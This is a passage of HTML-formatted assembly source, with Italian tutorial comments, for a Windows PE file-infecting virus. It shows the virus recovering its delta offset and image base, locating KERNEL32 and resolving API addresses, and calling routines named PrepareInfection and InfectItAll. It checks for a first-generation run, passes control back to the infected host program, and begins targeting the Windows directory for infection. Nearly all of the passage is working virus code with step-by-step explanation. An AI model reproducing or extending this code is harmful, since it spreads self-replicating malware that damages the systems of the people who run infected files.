normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>call<span style="mso-spacerun:
yes">    </span>delta<span style="mso-spacerun: yes">                          
</span>; ricava il delta offset<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>delta:<span
style="mso-spacerun: yes">  </span>pop<span style="mso-spacerun: yes">    
</span>ebp<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>mov<span style="mso-spacerun:
yes">     </span>eax,ebp<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>sub<span style="mso-spacerun:
yes">     </span>ebp,offset delta<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>sub<span style="mso-spacerun:
yes">     </span>eax,shit_size<span style="mso-spacerun:
yes">                   </span>; ricava l’ Image Base<span style="mso-spacerun:
yes">  </span><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>sub<span style="mso-spacerun:
yes">     </span>eax,00001000h<span style="mso-spacerun:
yes">                   </span>; <o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>NewEIP<span
style="mso-spacerun: yes">  </span>equ<span style="mso-spacerun: yes">    
</span>$-4<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>mov<span style="mso-spacerun:
yes">     </span>dword ptr [ebp+ModBase],eax<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>;----------------------------------------------------------------------------------------------------------------<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; 1) RICAVA IL DELTA
OFFSET<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; 2) RICAVA
L’IMAGE BASE DEL PROCESSO CORRENTE<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; inseriamo nello
stack tutti I registri e I flags (non perché ne abbiamo bisogno, ma perché è
buona <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; abitudine
farlo) Quindi otteniamo il delta offset.<span style="mso-spacerun: yes"> 
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; Seguono le
istruzioni per ottenere la Image Base del processo corrente. Ne avremo
bisogno<span style="mso-spacerun: yes">  </span>per ritornare <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; il controllo ad
esso (all’ host –RAM) Prima di tutto sottraiamo i bytes ta l’etichetta del
delta e l’etichetta<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; aztec label (7
bytes-&gt;PUSHAD (1)+PUSHFD (1)+CALL (5)), poi sottraiamo l’EIP corrente
(modificato <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; durante
l’infezione) e otteniamo così l’ Image Base corrente.<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>;----------------------------------------------------------------------------------------------------------------</span><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF'><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>mov<span style="mso-spacerun:
yes">     </span>esi,[esp+24h]<span style="mso-spacerun:
yes">                   </span>; ricava l0indirizzo di ritorno<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>and<span style="mso-spacerun:
yes">     </span>esi,0FFFF0000h<span style="mso-spacerun:
yes">                  </span>; Allinea a<span style="mso-spacerun: yes"> 
</span>10 pagine<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>mov<span style="mso-spacerun:
yes">     </span>ecx,5<span style="mso-spacerun:
yes">                           </span>; 50 pagine (in gruppi di 10)<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>call<span style="mso-spacerun:
yes">    </span>GetK32<span style="mso-spacerun: yes">                         
</span>; Chiama<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>mov<span style="mso-spacerun:
yes">     </span>dword ptr [ebp+kernel],eax<span style="mso-spacerun:
yes">      </span>; EAX deve essere l’ind.base di K32<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>;----------------------------------------------------------------------------------------------------------------<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; 3) RICAVA GLI
INDIRIZZI DEL KERNEL32<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>;; Inseriamo in
ESI l’indirizzo dal quale è stato chiamato questo processo (è in KERNEL32.DLL, <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; probabilmente
API CreateProcess), che inizialmente corrisponde all’indirizzo puntato da ESP,
ma <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; utilizzando lo
stack per inserire 24 bytes (20 usati da PUSHAD, gli altri 4 per PUSHFD), lo
abbiamo <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; fissato. Quindi
lo allineamo a 10 pagine, ponendo<span style="mso-spacerun: yes">  </span>a 0
la word meno significativa di ESI. Quind settiamo <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; gli altri
parametri per la procedura GetK32: ECX, che contiene il massimo numero di
gruppi<span style="mso-spacerun: yes">  </span>di 10 <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; pagine da
cercare per 5 (che dà 5*10=50 pagine), e chiamiamo la routine. GETK32 ci
ritorna l’indirizzo <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; di base di
KERNEL32, che salviamo.<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>;----------------------------------------------------------------------------------------------------------------</span><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF'><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>lea<span style="mso-spacerun:
yes">     </span>edi,[ebp+@@Offsetz]<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">      </span><span style="mso-spacerun:
yes">  </span>lea<span style="mso-spacerun: yes">     </span>esi,[ebp+@@Namez]<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>call<span style="mso-spacerun:
yes">    </span>GetAPIs<span style="mso-spacerun: yes">                        
</span>; Ricava indirizzi di tutte le API<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span></span></b><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>call<span style="mso-spacerun: yes">   
</span>PrepareInfection<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>call<span style="mso-spacerun: yes">    </span>InfectItAll<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>;----------------------------------------------------------------------------------------------------------------<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; 4) RICAVA GLI
INDIRIZZI DELLE API UTILIZZATE<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; 5) CERCA LE
DIRECTORY IN CUI INFETTARE<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; 6) SI RECA
NELLE DIRECTORY<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; Qui prepariamo
I parametri per la routine GetAPIs: in EDI<span style="mso-spacerun: yes"> 
</span>un puntatore ad un array di DWORDs che <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; conterrà gli
indirizzi delle API, e in ESI tutti I nomi delle API (ASCIIz) che ci servono.<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>;----------------------------------------------------------------------------------------------------------------</span><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF'><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>xchg<span style="mso-spacerun:
yes">    </span>ebp,ecx<span style="mso-spacerun: yes">                        
</span>; è alla prima generazione?<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>jecxz<span style="mso-spacerun:
yes">   </span>fakehost<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>popfd<span style="mso-spacerun:
yes">                                   </span>; Ripristina i flags<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>popad<span style="mso-spacerun:
yes">                                   </span>; Ripristina i registri<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>mov<span style="mso-spacerun:
yes">     </span>eax,12345678h<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>org<span style="mso-spacerun:
yes">     </span>$-4<span style="mso-spacerun: yes">                 </span><span
style="mso-spacerun: yes">            </span>; $ = indirizzo della riga !<span
style="mso-spacerun: yes">  </span><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>OldEIP<span style="mso-spacerun: yes">  </span>dd<span
style="mso-spacerun: yes">      </span>00001000h<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>add<span style="mso-spacerun: yes">     </span>eax,12345678h<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>org<span style="mso-spacerun: yes">     </span>$-4<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>ModBase dd<span style="mso-spacerun: yes">     
</span>00400000h<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">        </span></span></b><b
style='mso-bidi-font-weight:normal'><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>jmp<span style="mso-spacerun: yes">     </span>eax<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>;----------------------------------------------------------------------------------------------------------------<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; 17) SIAMO ALLA
PRIMA GENERAZIONE ? SI – RITORNA AL S.O.; NO – SOMMA VECCHIO <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>;<span
style="mso-spacerun: yes">        </span>ENTRY POINT ALLA VECCHIA IMAGE BASE E
VA AD ESEGUIRE L’HOST-RAM<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; Per prima cosa
controlliamo se siamo alla prima generazione, controllando se EBP è uguale a
zero. Se <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>;<span
style="mso-spacerun: yes">  </span>zero, effettuiamo un salto alla funzione
fakehost.<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; Se non siamo
alla prima generazione, tiriamo fuori dallo stack i registri di FLAG, e quindi
i registri <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; estesi.
Dopodiché abbiamo l’istruzione che mette in EAX il vecchio entry point che
aveva il programma <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; infettato
(l’host-RAM) e che era stato<span style="mso-spacerun: yes">  </span>modificato
durante l’infezione, e dopo aggiungiamo ad esso <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>;
l’ImageBase<span style="mso-spacerun: yes">  </span>del processo corrente,
modificato a runtime. Quindi effettuiamo un jmp all’indirizzo <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; contenuto da
EAX (vecchio entry point Host-RAM + ImageBase), ritornando in questa maniera il
<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFCC;mso-ansi-language:EN-US'>; controllo all’host-RAM.<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFCC;mso-ansi-language:EN-US'>;----------------------------------------------------------------------------------------------------------------<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>PrepareInfection:<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">        </span></span></b><b
style='mso-bidi-font-weight:normal'><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>lea<span style="mso-spacerun: yes">    
</span>edi,[ebp+WindowsDir]<span style="mso-spacerun: yes">            </span>;
Punta alla prima directory<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>push<span style="mso-spacerun:
yes">    </span>7Fh<span style="mso-spacerun: yes">                            
</span>; Pusha la misura del buffer<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>push<span style="mso-spacerun:
yes">    </span>edi<span style="mso-spacerun: yes">              </span><span
style="mso-spacerun: yes">               </span>; Pusha indirizzo del buffer<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span></span></b><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>call<span style="mso-spacerun: yes">   
</span>[ebp+_GetWindowsDirectoryA]<span style="mso-spacerun: yes">     </span>;
directory di Windows<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">        </span></span></b><b
